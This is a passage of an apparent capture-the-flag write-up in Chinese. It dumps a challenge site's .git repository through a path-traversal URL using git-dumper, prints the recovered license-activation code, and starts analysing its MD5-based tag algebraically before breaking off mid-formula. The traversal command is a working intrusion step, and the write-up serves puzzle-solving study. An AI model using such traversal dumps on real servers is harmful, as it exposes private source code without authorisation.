+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pipx install git-dumper</span><br><span class="line">git-dumper https://xn--kpr97vl4kg3x.xn--e5x.tw:9114/static/..%2F/.git/ website/</span><br><span class="line"><span class="built_in">ls</span> website</span><br><span class="line">Dockerfile   README.md   bin   bun.lock   compose.yaml   eslint.config.mjs   package.json   prisma   readkey.c   src   static	 template   tsconfig.json  <span class="string">''</span>$<span class="string">'\346\255\220\345\205\247\350\251\262'</span></span><br></pre></td></tr></table></figure></div>
+
+<p>從 <code>src/crypto.ts</code> 找到驗證使用的密碼學函數：</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">PrismaClient</span> } <span class="keyword">from</span> <span class="string">'@prisma/client'</span></span><br><span class="line"><span class="keyword">import</span> { randomBytes } <span class="keyword">from</span> <span class="string">'node:crypto'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> prisma = <span class="keyword">new</span> <span class="title class_">PrismaClient</span>()</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">H</span>(<span class="params">s: bigint</span>): bigint {</span><br><span class="line">  <span class="keyword">const</span> m = <span class="title function_">bigIntToBytes</span>(s, <span class="number">128</span>)</span><br><span class="line">  <span class="keyword">const</span> hasher = <span class="keyword">new</span> <span class="title class_">Bun</span>.<span class="title class_">CryptoHasher</span>(<span class="string">'md5'</span>)</span><br><span class="line">  hasher.<span class="title function_">update</span>(m)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">BigInt</span>(<span class="string">'0x'</span> + hasher.<span class="title function_">digest</span>(<span class="string">'hex'</span>))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateActivation</span>(<span class="params">r: bigint, s: bigint</span>): bigint {</span><br><span class="line">  <span class="keyword">let</span> acc = <span class="title class_">BigInt</span>(<span class="string">'0'</span>)</span><br><span class="line">  <span class="keyword">const</span> p = (<span class="title class_">BigInt</span>(<span class="string">'1'</span>) &lt;&lt; <span class="title class_">BigInt</span>(<span class="number">128</span>)) - <span class="title class_">BigInt</span>(<span class="number">159</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) {</span><br><span class="line">    acc += s</span><br><span class="line">    acc = (r * acc) % p</span><br><span class="line">    s = <span class="title function_">H</span>(s)</span><br><span class="line">  }</span><br><span class="line">  acc += s</span><br><span class="line">  <span class="keyword">return</span> acc % p</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">calculateActivationTag</span>(<span class="params"></span></span><br><span class="line"><span class="params">  license: string,</span></span><br><span class="line"><span class="params">  computerInfo: string</span></span><br><span class="line"><span class="params"></span>): string | <span class="literal">false</span> {</span><br><span class="line">  <span class="keyword">const</span> r = <span class="title class_">BigInt</span>(<span class="string">`0x<span class="subst">${license}</span>`</span>)</span><br><span class="line">  <span class="keyword">if</span> (r.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="property">length</span> != <span class="number">32</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> hasher = <span class="keyword">new</span> <span class="title class_">Bun</span>.<span class="title class_">CryptoHasher</span>(<span class="string">'md5'</span>)</span><br><span class="line">  hasher.<span class="title function_">update</span>(computerInfo)</span><br><span class="line">  <span class="keyword">const</span> s = <span class="title function_">bytesToBigInt</span>(hasher.<span class="title function_">digest</span>() <span class="keyword">as</span> <span class="title class_">Uint8Array</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`0x<span class="subst">${generateActivation(r, s).toString(<span class="number">16</span>)}</span>`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generateLicense</span>(<span class="params">itemId: string, license?: string</span>) {</span><br><span class="line">  <span class="keyword">if</span> (license == <span class="literal">null</span>) license = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">'hex'</span>)</span><br><span class="line">  <span class="keyword">while</span> (<span class="title class_">BigInt</span>(<span class="string">`0x<span class="subst">${license}</span>`</span>).<span class="title function_">toString</span>(<span class="number">16</span>).<span class="property">length</span> != <span class="number">32</span>) {</span><br><span class="line">    license = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">'hex'</span>)</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="keyword">await</span> prisma.<span class="property">license</span>.<span class="title function_">create</span>({</span><br><span class="line">      <span class="attr">data</span>: { itemId, <span class="attr">content</span>: license },</span><br><span class="line">    })</span><br><span class="line">  ).<span class="property">content</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">activateLicense</span>(<span class="params"></span></span><br><span class="line"><span class="params">  license: string,</span></span><br><span class="line"><span class="params">  computerInfo: string,</span></span><br><span class="line"><span class="params">  itemId: string | <span class="literal">undefined</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;boolean&gt; {</span><br><span class="line">  <span class="keyword">if</span> (itemId == <span class="literal">null</span>) itemId = (<span class="keyword">await</span> prisma.<span class="property">item</span>.<span class="title function_">findFirst</span>())?.<span class="property">id</span></span><br><span class="line">  <span class="keyword">if</span> (itemId == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="keyword">await</span> prisma.<span class="property">license</span>.<span class="title function_">findUnique</span>({ <span class="attr">where</span>: { <span class="attr">content</span>: license } })))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">const</span> tag = <span class="title function_">calculateActivationTag</span>(license, computerInfo)</span><br><span class="line">  <span class="keyword">if</span> (!tag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> prisma.$transaction(<span class="title function_">async</span> (tx) =&gt; {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      <span class="keyword">const</span> exitingLicense = <span class="keyword">await</span> tx.<span class="property">license</span>.<span class="title function_">update</span>({</span><br><span class="line">        <span class="attr">where</span>: { <span class="attr">content</span>: license },</span><br><span class="line">        <span class="attr">data</span>: { <span class="attr">usedCount</span>: { <span class="attr">increment</span>: <span class="number">1</span> } },</span><br><span class="line">      })</span><br><span class="line">      <span class="keyword">if</span> (exitingLicense.<span class="property">usedCount</span> &gt;= exitingLicense.<span class="property">totalUses</span>) {</span><br><span class="line">        <span class="keyword">await</span> tx.<span class="property">license</span>.<span class="title function_">delete</span>({ <span class="attr">where</span>: { <span class="attr">id</span>: exitingLicense.<span class="property">id</span> } })</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">await</span> tx.<span class="property">activation</span>.<span class="title function_">create</span>({ <span class="attr">data</span>: { tag, itemId } })</span><br><span class="line">    } <span class="keyword">catch</span> (e) {</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    }</span><br><span class="line">  })</span><br><span class="line">  <span class="keyword">if</span> (!result) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">verifyActivation</span>(<span class="params"></span></span><br><span class="line"><span class="params">  license: string,</span></span><br><span class="line"><span class="params">  computerInfo: string,</span></span><br><span class="line"><span class="params">  itemId: string | <span class="literal">undefined</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;boolean&gt; {</span><br><span class="line">  <span class="keyword">if</span> (itemId == <span class="literal">null</span>) itemId = (<span class="keyword">await</span> prisma.<span class="property">item</span>.<span class="title function_">findFirst</span>())?.<span class="property">id</span></span><br><span class="line">  <span class="keyword">const</span> tag = <span class="title function_">calculateActivationTag</span>(license, computerInfo)</span><br><span class="line">  <span class="keyword">if</span> (!tag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">const</span> activation = <span class="keyword">await</span> prisma.<span class="property">activation</span>.<span class="title function_">findFirst</span>({</span><br><span class="line">    <span class="attr">where</span>: { tag, itemId },</span><br><span class="line">  })</span><br><span class="line">  <span class="keyword">if</span> (!activation) <span class="keyword">return</span> <span class="title function_">activateLicense</span>(license, computerInfo, itemId)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>整理一下</p>
+<p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.02ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 451 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container> : license<br><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.023ex" role="img" focusable="false" viewBox="0 -442 469 452"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container> : hashed computerInfo</p>
+<p>ActivationTag = <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="43.957ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 19429.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(778,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1905.8,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(2628,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3301.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(4301.4,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(5207,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5818.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(6540.4,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7213.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(8213.9,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(9119.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9730.7,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(10452.9,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11070.5,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(12242.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12853.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(13854,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mn" transform="translate(502,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mspace" transform="translate(14759.5,0)"></g><g data-mml-node="mo" transform="translate(15759.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(16148.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mspace" transform="translate(18037.5,0)"></g><g data-mml-node="mi" transform="translate(18537.2,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(19040.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>可簡化成 <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" 